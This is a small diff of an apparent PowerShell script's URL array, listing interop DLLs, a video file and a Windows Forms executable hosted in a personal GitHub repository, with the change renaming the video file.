@@ -1,7 +1,7 @@
 $urls = @(
     "https://github.com/webntdev/webntdev.github.io/raw/main/application/AxInterop.WMPLib.dll",
     "https://github.com/webntdev/webntdev.github.io/raw/main/application/Interop.WMPLib.dll",
-    "https://github.com/webntdev/webntdev.github.io/raw/main/apps/file.mp4",
+    "https://github.com/webntdev/webntdev.github.io/raw/main/apps/video.mp4",
     "https://github.com/webntdev/webntdev.github.io/raw/main/application/WindowsFormsApp2.exe"
 )
 
